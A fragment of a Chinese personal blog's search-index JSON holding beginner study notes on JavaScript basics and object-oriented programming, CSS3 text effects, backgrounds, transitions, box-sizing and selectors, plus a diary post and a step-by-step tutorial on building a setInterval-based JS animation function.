}","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"复习及面向对象初步","date":"2017-07-04T14:14:18.000Z","path":"2017/07/04/01-复习以及面向对象初步/","text":"JavaSript包含三大部分:ECMAScript:规定js的语法规法DOM: Document Object Model 文档对象模型,给我们提供了一套完整的操作页面apiBOM: Browser Object Model 浏览器对象模型 数据类型:基本数据类型: string number boolean undefined复杂数据类型(引用类型): Date Array Object RegExp String Number Boolean Function Math Null等…使用typeof null返回的结果是”object”,但他却并不是一个引用类型,是一个值类型的数据,但是表现却像一个值类型,且null==undefined//true null===undefined//false这个是bug in关键字 用于for in循环 判断属性是否存在于对象中语法： 属性名 in 对象属性名要用引号var isExist = “name” in obj; 数组用法 判断索引是否存在,而非值 “index in arr”console.log(0 in arr);0是index,也可用console.log(“0” in arr);此处会进行隐式转换,无问题 注:如何判断数组中是否存在指定的值. arr.indexOf(value) 返回索引值. 值传递与引用传递 首先,形参和实参并不是同一个值 其次,形参与实参之间存在值传递和引用传递的过程,是一个复制(赋值)的过程. 值传递:形参单纯的将实参的值复制一遍,形参修改不影响到外部的实参值. 引用传递:形参获得实参存储的地址指向,在函数内部通过形参修改对象,则会改变外部对象. 注:倘若形参重新存储地址指向(创建对象),那么形参与实参则分别指向不同对象,相互操作不受影响 对象的动态特性.在对象创建出来之后,可以为对象动态添加新属性和新方法. 使用点语法,例如obj.name,可以获取对象的属性值,也可以修改对象的属性值,还可以为对象新增属性并赋值. 例如obj.name=”xxx”,进行赋值的时候,如果存在该属性则进行修改值.如果对象不存在该属性,是给该对象添加属性或方法. 可以通过对象名[“属性名]访问对象的属性值,注意这里的属性名是字符串,如果这里使用的不是字符串,那么会隐式地转变成字符串.例如obj[“name”],同时也可以也可以修改对象的属性值,还可以为对象新增属性并赋值. 此处给obj对象添加了一个属性,这个属性也是一个对象: var obj={ name:&quot;zzw&quot;; age:18 } obj[&quot;car&quot;]={ brand:&quot;benz&quot;; price:1000000; } 注:对象是不是键值对的集合？json的属性名必须要加双引号,对象可以不用加. 总结:新增属性、方法的方式有：1.点语法2.通过[]的形式,必须使用字符串 delete关键字 delete关键字可以用来删除对象的属性,以及不是用var声明的变量 执行完delete关键字会有返回值,删除成功返回true删除失败返回false 特殊之处:删除不存在的属性返回true var result = delete obj.gender;//true 如果删除的属性存在于原型当中,那么返回值为true但是并未删除. 异常捕获 try{ 可能出现异常的代码; }catch(e){ 捕获异常后的执行代码; }finally{ 最终执行的代码; } 案例:面向对象编程举例 01-03需求:给页面中的div与p标签加上border 面向过程解决方式设置页面中div和p的边框为1px solid red面向过程方式 var divs=document.querySelectorAll(&apos;div&apos;); var ps= document.querySelectorAll(&apos;p&apos;); for(var i=0;i&lt;divs.length;i++){ divs[i].style.border=&quot;1px solid red&quot;; } for(var i=0;i&lt;ps.length;i++){ ps[i].style.border=&quot;1px solid red&quot;; } //编写代码的原则: DRY don&apos;t repeat yourself 函数封装解决方式使用函数将代码封装,使得复用性更高使用函数封装带来的问题:1.全局变量污染2.代码结构不够清晰,维护困难 var divs=getElements(&apos;div&apos;); var ps=getElements(&apos;p&apos;); setStyle(divs); setStyle(ps); function getElements(tagName){ var elems=document.querySelectorAll(tagName); return elems; } function setStyle(elems){ for(var i=0;i&lt;elems.length;i++){ elems[i].style.border=&quot;1px solid red&quot;; } } 面向对象解决方式使用对象封装后的优势1.暴露在全局中的只有一个对象名,不会造成全局变量污染2.是用对象将代码进行功能模块化的划分,有利于日后的维护 //DRY var zQuery={ //使用zQuery对象属性根据功能对对象进行模块化 //获取元素的zQuery属性对象 getEle:{ //1.获取元素的方法们 tag:function(tagName){ return document.querySelectorAll(tagName); }, id:function(id){ return document.getElementById(id); } }, //修改css样式的zQuery属性对象 setCss:{ //修改css样式的方法们 setStyle:function(elems){ for(var i=0;i&lt;elems.length;i++){ elems[i].style.border=&quot;1px solid red&quot;; } } css:function(option){ //... } addClass:function(className){ //... } } }; var divs=zQuery.tag(&apos;div&apos;); var ps=zQuery.tag(&apos;p&apos;); zQuery.setStyle(divs); zQuery.setStyle(ps); 面向对象三大特征:封装 继承 多态","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"css3文本效果","date":"2017-03-20T05:22:59.000Z","path":"2017/03/20/css3文本效果/","text":"新增颜色模式-rgba hslargba是什么？ r:红色 g:绿色 b:蓝色 0-255 a:透明度0-1 能做什么？ 盒子内背景透明，文字不透明，给浅色系文字添加深色系透明背景。不影响背景图片的显示，同时突出文字。 css2:opacity的局限性，给父盒子设置透明度，子盒子受到影响，且子盒子无法改变透明度。transparent完全透明，无法改变透明度。而rgba是颜色，可以做用与背景，直接改变背景色的透明度。 hsla h:色调 0-360 s:饱和度 0-100% l:亮度 0-100% a:透明度 文字阴影-text-shadow 4个参数 x偏移量(+右-左) y偏移量(+下-上) 模糊程度 阴影颜色 text-shadow:0 0 10px red; 阴影叠加 text-shadow:0 0 10px red,-5px 10px 10px blue,....; 浮雕效果 p{ font-size: 100px; line-height: 200px; color: #fff; text-shadow: 2px 2px 4px #000; } 凹凸文字效果 .p1{//凸 text-shadow:-1px -1px 0 white,1px 1px 0 black; } .p2{//凹 text-shadow:-1px -1px 0 black,1px 1px 0 white; } 文字模糊 将自身颜色调整为黑色完全透明 用大阴影将其遮住(模糊程度大) 将阴影颜色调整为黑色透明度0.5，即可生成文字模糊效果。 h1{ color: rgba(0,0,0,0); text-shadow: 0 0 5px rgba(0,0,0,0.5); } 文字描边 -webkit-text-stroke:宽度 颜色文字排版 direction+unicode-bidi:bidi-overrider;右对齐并且文字从右向左(全兼容) p{ width: 200px; height: 50px; border: 1px solid red; direction: rtl; unicode-bidi: bidi-override; } 文字超出部分显示省略号 text-overflowp{ width: 500px; overflow: hidden; white-space: nowrap;/*不准换行*/ -ms-text-overflow: ellipsis; text-overflow: ellipsis;/*显示省略号*/ }","tags":[{"name":"css3","slug":"css3","permalink":"http://yoursite.com/tags/css3/"}]},{"title":"css3背景","date":"2017-03-20T05:22:31.000Z","path":"2017/03/20/css3背景/","text":"背景图片之前的背景图片在容器中只能显示容器大小的部分.css3在css2基础上加入了更为灵活的背景图片机制,可以十分容易的控制背景图片.而不用分散精力在背景图的大小上. 背景大小: background-size:水平宽度 垂直高度. background-size:cover;完全覆盖盒子,可能会超出盒子. background-size:contain;保证背景图片最大化的在盒子中等比例显示但是不保证能铺满盒子. 这两个属性可以很好的使得图片自适应容器大小,对响应式设计十分友好. 背景原点:控制背景从什么地方开始显示background-origin:padding-box(默认)/border-box/content-box 背景裁剪:与背景原点搭配使用,裁剪背景图片.background-clip属性值为border-box/padding-box/content-box当超出背景裁剪属性值所代表的box时,超出部分clip掉,例如背景原点在padding-box但是背景裁剪在content-box,那么padding-box及content-box之间的部分会被clip. 多背景:给盒子加多个背景,按照背景语法格式书写 background: url(‘images/bg1.png’) no-repeat left top ,url(‘images/bg2.png’) no-repeat right top ,url(‘images/bg3.png’) no-repeat right bottom ,url(‘images/bg4.png’) no-repeat left bottom; background-position:确定背景位置 水平位置 垂直位置left top左上","tags":[{"name":"css3","slug":"css3","permalink":"http://yoursite.com/tags/css3/"}]},{"title":"css3过渡","date":"2017-03-20T05:22:31.000Z","path":"2017/03/20/css3过渡/","text":"过渡transition混合写法:transition:过度的属性 过渡时间,过度的属性 过渡时间…linear(匀速) 延迟时间; transition: all 2s linear 2s; transition: width 1s,background-color 1s; 过渡必须加给盒子本身 拆分写法:过渡属性transition-property:width;过渡时间transition-duration:2s;过渡曲线(linear线性 ease-in加速 ease-out减速 ease-in-out先加速后减速)transition-timing-function:linear;过渡延迟执行时间transition-delay:2s; 案例:小米产品页 感想:css3的过渡属性十分简便,只用写好原始状态和最终状态通过过渡连接即可,但是也有局限性,只能对自己产生影响,这是硬伤,但是其快捷的用法较js方便许多,即使css3能做的js大部分都能做到(小部分如背景颜色,背景阴影做不到 ).以下的效果,鼠标移上时出现span(位移改变),出现阴影,item上移. 还可以用js来完成 animate函数来移动位置 亦或是slide show or hide , fade等函数让其在原地出现或是消失 但是box-shadow还是无法让js实现. 那什么时候用css3过渡什么时候用js动画呢?看动作是作用于自身还是要作用于别处(例如小米手风琴只能改变自身盒子宽度,无法缩减别的盒子宽度) body{ background-color: #eee; } .items{ width: 1100px; margin: 100px auto; } .item{ margin-left: 20px; float: left; width: 200px; height: 300px; background-color: #fff; text-align: center; position: relative; overflow: hidden; transition: all 0.7s; } .item img{ width: 200px; } .item span{ position: absolute; bottom: -80px; left: 0; width: 100%; height: 80px; background-color: #f40; transition: all 0.5s; } .item:hover{ box-shadow: 4px 4px 10px 10px #ccc; margin-top:-5px; } .item:hover span{ bottom: 0; }","tags":[{"name":"css3","slug":"css3","permalink":"http://yoursite.com/tags/css3/"}]},{"title":"盒子模型与box-sizing","date":"2017-03-18T15:17:04.000Z","path":"2017/03/18/盒模型与box-sizing/","text":"传统的盒子模型最终表现出来的宽度=内容宽度(width)+2padding+2border 最终表现出来的高度=内容高度(height)+2padding+2border 如果改变了padding,盒子整个展现出来的大小就会发生变化,即使我们设置的width是个定值并没有变化. 实际上存在三个盒子: content-box 实际内容盒子 content-box padding-box content-box包上padding的padding-box border-box padding-box加上border的border-box 此处引入box-sizing属性,该属性有两个值 content-box(默认,外加模式) border-box(内减模式). box-sizing后面的属性值所代表的盒子宽度是始终不会变的,始终为我们设置的width. 默认是content-box,即我们的width设置的是content-box的宽度.所以加上padding和border实际表现出来的宽度会变大,这种模式被称为外加模式. 如果修改为border-box,设置的width就是最终表现出来的宽度,因为border-box的宽度就是我们设置的width值,如果padding值也确定了,那么只会减少content-box的宽度,这种模式被成为内减模式. 有了box-sizing:border-box; 以后给盒子动态增加border padding不必担心会撑大盒子造成溢出换行等混乱 注: 上述讨论的为W3C盒子模型（1）盒子模型有两种， IE 盒子模型、W3C 盒子模型；（2）盒模型： 内容(content)、填充(padding)、边界(margin)、 边框(border)；（3）区 别： IE的content部分把 border 和 padding计算了进去; 很明显IE的盒子模型更符合人的认知,于是W3C才有了后续的box-sizing.","tags":[{"name":"css","slug":"css","permalink":"http://yoursite.com/tags/css/"}]},{"title":"Hello World","date":"2017-03-18T11:20:56.000Z","path":"2017/03/18/hello-world/","text":"前言 花了两个多小时总算是把这个博客搭好了，很过意不去的是把给周娇娇的域名绑在了这个博客上，因为GithubPages的限制，不过好在昨天晚上花九块九买了一个月的云服务器，下次买个域名，把这个域名还给周娇娇，然后把她的网站迁到服务器上去。 路漫漫其求玄兮 真是剑未配妥，出门已是江湖，自己现在的水平才堪堪入门，甚至入门都提不上，越学习越无知，也是挺无奈的。每天满打满算利用起来的时间也只有五六个小时，也会倦怠，想速成、想实战、想提高，不想学基础知识，不想看着那些概念。 急功近利，时间也真的不多了。 希望这个月把html5和css3尽量快点学完，投入到移动web开发。 以后这个博客会用来更新每天学习的笔记，也会记录一些生活中的琐事，今天已经很晚了，很多内容还没有完善，周娇娇又还等着我写完日记洗漱睡觉，各位晚安。 Hello Javascript. Hello World.","tags":[{"name":"琐事","slug":"琐事","permalink":"http://yoursite.com/tags/琐事/"},{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/tags/随笔/"}]},{"title":"css3选择器","date":"2017-03-17T15:37:21.000Z","path":"2017/03/17/css3选择器/","text":"特点：选择器更灵活 行为表现丰富 属性选择器符号 [] 通过标签属性来选择语法:E[attr=”value”] E:[title] 选中页面中的E元素，并且E需要带有title属性 ^:开头 div[title^=&quot;aa&quot;]/*带有title属性,且值为以&quot;aa&quot;开头的div*/ $:结尾 div[title$=&quot;bb&quot;]/*带有title属性,且值为以&quot;bb&quot;结尾的div*/ *:包含 div[title*=&quot;aa&quot;]/*带有title属性,且值包含&quot;aa&quot;的div*/ ~:包含div[title$=&quot;bb&quot;]带有title属性,属性值列表中(以空格分割),且值为以&quot;bb&quot;结尾的div*/ 伪类选择器符号：冒号 结构伪类：通过结构来筛选 li:first-child /*选中第1个li:选中li父元素ul的第一个子元素!!!并且这个元素是li标签 相当于li:nth-child(1)*/ li:last-child /*选中最后1个li:选中li父元素ul的最后一个子元素，如果是li则追加样式如果不是则样式失效 相当于li:nth-last-child(1)*/ li:nth-child(11) /*选中第11个li:选中li父元素ul的第11个子元素.索引从1开始*/ li:nth-child(odd) /*选中奇数*/ li:nth-child(even)/*选中偶数*/ li:nth-child(2n) /*此处表示选中偶数*/ li:nth-child(-n+5)/*选中前五个-0+5 -1+5 -2+5 -3+5 -4+5 -5+5*/ li:nth-last-child(-n+5) /*选中后五个*/ li:nth-child(7n) /*选中7的倍数个*/ 注: p:nth-of-type(2)//找到p元素的父级下的第二个p元素 p:nth-last-of-type(2)//找到p元素的父级下的第二个p元素 p:first-of-type p:last-of-type n表示0.1.2.3.4.5.6.7.8…偶数：2n even 奇数：2n-1 odd 前五个:-n+5 empty伪类选择器div:empty 选中内部为空的div元素 target锚点选择器h2:target配合锚点使用，对应锚点被激活触发样式.可以用来实现选项卡，当选项链接被点击时通过锚点样式使得对应内容显示出来，无需使用Js. 针对表单有专门的伪类选择器，如 input:enable{}//选择可以编辑的输入框 input:disable{}//选择不可编辑的输入框 input:checked{}//选择被选中的checkbox或radio,可以用于模拟单选框 not选择符 h1:not(.a){}//对h1所有标签添加样式，class=&apos;a&apos;的元素除外 伪元素before与after用CSS模拟出html效果，假的标签伪 元素 伪：假的 ，元素：标签标志性符号：双冒号(::)css span::before{ content:&quot;今天&quot;; } span::after{ content:&quot;真好&quot;; } html &lt;span&gt;今天&lt;/span&gt; dom &lt;span&gt;::before 今天 ::after&lt;/span&gt;必须要有content属性，如果为空则为”” 伪元素选择器 span::first-letter /*选中第一个字*/ p::first-line /*选中第一行*/ p::selection /*表示当前选中的区域，通常改变选中区的背景颜色与当前颜色*/ 首字下沉效果： p:first-child::first-letter{ font-size:40px; float:left; } 选中区颜色: p::selection{ color:red; background-color:green; } transition:渐变时间 .box{ width: 100px; height: 100px; background-color: red; } .box:hover{ width: 200px; height: 200px; background-color: blue; transition:1s;//过渡时间1s } tips:外部css的地址引用是相对于该css文件的 ， 而内部css的地址引用是相对于html文档的","tags":[{"name":"css3","slug":"css3","permalink":"http://yoursite.com/tags/css3/"}]},{"title":"js动画函数封装","date":"2017-03-15T16:00:00.000Z","path":"2017/03/16/js动画函数封装/","text":"前言这是我的第一篇关于js的文章，如有错误，恳请指正。这一系列文章的主题是复习动画函数，本文为第一篇。动画并不是真的在动，而是每隔一个极小的时间将一个element移动一个极小的距离，使人产生动画的效果，如果读者看过小时候快速翻页就会产生动画效果的小人书那应当不难理解。 好了，让我们开始吧。 函数最终代码（初步） //elem:要移动的元素 fianl_x final_y 目的地坐标(相对于父盒子)12345678910111213141516171819function animate(elem, final_x, final_y) &#123; clearInterval(elem.timer); //要用定时器，先清定时器 elem.timer = setInterval(function () &#123; var x = parseInt(elem.style.left) || 0; var y = parseInt(elem.style.top) || 0; if (x === final_x &amp;&amp; y === final_y) &#123; clearInterval(elem.timer); //用完定时器，清除定时器 return true; &#125; var distx = (final_x - x) / 10; distx = distx &gt; 0 ? Math.ceil(distx) : Math.floor(distx); x = x + distx; var disty = (final_y - y) / 10; disty = disty &gt; 0 ? Math.ceil(disty) : Math.floor(disty); y = y + disty; elem.style.left = x + \"px\"; elem.style.top = y + \"px\"; &#125;, 25);&#125; 准备工作首先，要移动的元素必须是绝对定位的，前面也说了，我们是不断地在一个极小的事件不断的更新元素的横竖位置(相对于父盒子)，而符合我们要求的便是绝对定位了，通过更改left,right,top,bottom等属性的值来更改元素的位置。参数里有元素的最终位置，我们也需要获取元素的初始位置。注意:此处要转为整型，因为ele.style.left获取的是一个字符串，带单位”px”. 12345678910111213function animate(elem,final_x,fianl_y)&#123; var x,y; if(elem.style.left)&#123; x = parseInt(elem.style.left); &#125;else&#123; x = 0; &#125; if(elem.style.top)&#123; y = parseInt(elem.style.top); &#125;else&#123; y = 0; &#125;&#125; 但是可能这个元素并没有设置left以及top的值，于是我们需要进行检测,如果没有这两个值则将它们设置为0(实际上一个绝对定位的元素如果没有设置值的话默认为0，0)； 好啦，现在我们得到了元素的起始位置，那么什么时候这个函数才算完成了任务呢？没错，就是起始位置与终止位置相等时。于是我们加入函数结束的条件。 123if(x==final_x&amp;&amp;y==final_y)&#123;//如果起始位置与目标位置一致 return true;&#125; 接下来我们的问题就是该怎么移动这个元素了。 不断的移动一个微小的距离，造成动画的效果。 敲黑板，划重点。 “不断”。没错就是我们的setInterval(a,b)定时器。这个函数有两个参数，第一个参数a是要执行的代码块，第二个参数b是执行的间隔时间,这里我们让它每25ms执行一次吧。 我们的逻辑就是：每隔一段时间，获取一次元素当前位置，让元素移动一个微小的距离，如果当前位置等于目标位置，我们就退出setInterval函数,如果不等于，则重复执行代码块a。 现在的代码如下： 12345678910111213141516setInterval(function()&#123; var x,y; if(elem.style.left)&#123; x = parseInt(elem.style.left); &#125;else&#123; x = 0; &#125; if(elem.style.top)&#123; y = parseInt(elem.style.top); &#125;else&#123; y = 0; &#125; if(x==final_x&amp;&amp;y==final_y)&#123; return true; &#125;&#125;,25); “一个微小的距离”。即我们每个25ms让其移动的距离，这里我们取10px; 1234567891011121314151617181920212223242526272829setInterval(function () &#123; var x, y; if (elem.style.left) &#123; x = parseInt(elem.style.left); &#125; else &#123; x = 0; &#125; if (elem.style.top) &#123; y = parseInt(elem.style.top); &#125; else &#123; y = 0; &#125; if (x === final_x &amp;&amp; y === final_y) &#123; return true; &#125; var dist = 10; //我们移动的距离 if (x &lt; fianl_x) &#123; //如果横向在目标位置左侧，则+10向目标位置前进 x = x + 10; &#125; if (x &gt; final_x) &#123; //如果横向在目标位置右侧，则-10向目标位置后退 x = x - 10; &#125; if (y &lt; fianl_y) &#123; //同上 y = y + 10; &#125; if (y &gt; fianl_y) &#123; y = y - 10; &#125;&#125;, 25); 然后再将增加或减少了的x,y重新赋值给元素的left以及top属性 12elem.style.left = x + \"px\";elem.style.top = y + \"px\"; 这样，我们就初步完成了动画函数，每隔25ms将元素移动10px(x轴与y轴)，如果当前位置等于了目标位置，则退出setInterval函数，animate执行完毕。此时代码清单如下:123456789101112131415161718192021222324252627282930313233function animate(elem, final_x, fianl_y) &#123; setInterval(function () &#123; var x, y; if (elem.style.left) &#123; x = parseInt(elem.style.left); &#125; else &#123; x = 0; &#125; if (elem.style.top) &#123; y = parseInt(elem.style.top); &#125; else &#123; y = 0; &#125; if (x == final_x &amp;&amp; y == final_y) &#123; return true; &#125; var dist = 10; //我们移动的距离 if (x &lt; fianl_x) &#123; //如果横向在目标位置左侧，则+10向目标位置前进 x = x + 10; &#125; if (x &gt; final_x) &#123; //如果横向在目标位置右侧，则-10向目标位置后退 x = x - 10; &#125; if (y &lt; fianl_y) &#123; //同上 y = y + 10; &#125; if (y &gt; fianl_y) &#123; y = y - 10; &#125; &#125;, 25); elem.style.left = x + \"px\"; elem.style.top = y + \"px\";&#125; 但是这串代码既不健壮也不简洁，还可以优化。 我们可以先简化一下代码：123456789101112131415161718192021222324function animate(elem, final_x, final_y) &#123; setInterval(function () &#123; var x = parseInt(elem.style.left) || 0; var y = parseInt(elem.style.top) || 0; if (x === final_x &amp;&amp; y === final_y) &#123; return true; &#125; var dist = 10; if (x &lt; fianl_x) &#123; //如果横向在目标位置左侧，则+10向目标位置前进 x += 10; &#125; if (x &gt; final_x) &#123; //如果横向在目标位置右侧，则-10向目标位置后退 x -= 10; &#125; if (y &lt; fianl_y) &#123; //同上 y += 10; &#125; if (y &gt; fianl_y) &#123; y -= 10; &#125; elem.style.left = x + \"px\"; elem.style.top = y + \"px\"; &#125;, 25);&#125; 问题1. 移动距离每次都是固定的(10px)，是匀速移动。我们想逼真一点，当距离目标位置越近时速度变得越慢，产生渐变的效果； 问题2. 定时器没有及时清除。 假如你先想通过调用animate函数将elem移动到目标位置1，在其还未到达的时候，又改变主意让它移动到目标位置2，再调用animate函数，传入了新的final_x,final_y，此时就会造成两个定时器同时运作，产生混乱。 定时器A想让它到目标位置1，定时器B想让它到目标位置2,获取的元素当前位置却是同一个，就会造成elem摇摆不定，所以要以后一次的调用为准，清除前一次的定时器。对了，到达目标位置后也要清除，总不能把人家白白搁在那。 要养成好习惯：要用定时器，先清定时器。用完定时器，清除定时器。 首先解决问题1。 12var distx = (final_x - x) / 10;var disty = (final_y - y) / 10; 此时，我们的移动的距离不再是相同的10px，而是根据目标位置与当前位置的差（距离差）来进行动态计算，当前位置距离目标位置越近我们移动的距离越小,每次移动距离差的十分之一，这样我们就不再是匀速运动了，距离差在不断减小，我们移动距离dist也在不断减小。那些if也让人看着生厌，这时我们的distx,disty已经带有正负号，可以直接加在x,y上了。/10要有取整处理，正负数的向上取整不同。代码如下： 123456var distx = (final_x - x) / 10;distx = distx &gt; 0 ? Math.ceil(distx) : Math.floor(distx);x = x + distx;var disty = (final_y - y) / 10;disty = disty &gt; 0 ? Math.ceil(disty) : Math.floor(disty);y = y + disty; 问题1结束。 其次解决问题2。 我们可以知道，多个定时器都是作用在同一个元素上面，我们可以将每次进行的定时器的ID绑定在元素上，下一次执行新的定时器时将元素本身的定时器clear（也就是上一个定时器）,再将此次定时器ID绑定即可。 最终代码： 12345678910111213141516171819function animate(elem, final_x, final_y) &#123; clearInterval(elem.timer); //要用定时器，先清定时器 elem.timer = setInterval(function () &#123; var x = parseInt(elem.style.left) || 0; var y = parseInt(elem.style.top) || 0; if (x === final_x &amp;&amp; y === final_y) &#123; clearInterval(elem.timer); //用完定时器，清除定时器 return true; &#125; var distx = (final_x - x) / 10; distx = distx &gt; 0 ? Math.ceil(distx) : Math.floor(distx); x = x + distx; var disty = (final_y - y) / 10; disty = disty &gt; 0 ? Math.ceil(disty) : Math.floor(disty); y = y + disty; elem.style.left = x + \"px\"; elem.style.top = y + \"px\"; &#125;, 25);&#125;","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]}]